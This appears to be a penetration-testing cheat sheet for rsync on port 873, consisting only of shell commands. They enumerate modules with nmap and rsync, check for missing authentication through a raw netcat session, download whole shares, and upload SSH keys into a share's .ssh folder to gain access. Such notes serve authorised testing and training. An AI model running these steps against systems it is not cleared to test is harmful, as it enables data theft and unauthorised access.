# 873 - rsync



{% code overflow="wrap" fullWidth="true" %}
```bash
https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync

# Enumerate rsync shares
nmap -sV --script "rsync-list-modules" -p 873 $box 
rsync -rdt rsync://192.168.55.126:873

# Check if authentication is required
kali@kali:~$ nc -nv 192.168.120.149 873 
@RSYNCD: 31.0 # after showing this, the terminal hangs 
@RSYNCD: 31.0 # type the same output (this) to continue
# Let's determine if this module requires authentication by simply entering the module name.
$module_name
@RSYNCD: OK #if we see ok, no authentication (user+pass) is required

rsync -av --list-only rsync://$box/$share # list files inside a share
# Username parameter is optional, needed if we have to provide rsync credentials to perform some actions
rsync -av rsync://[$username@]$box/$share . # download all files recursively from the share to the current folder
rsync -av .ssh rsync://[$username@]$box/$share/.ssh # upload files/folders to the share (e.g. SSH keys)
```
{% endcode %}
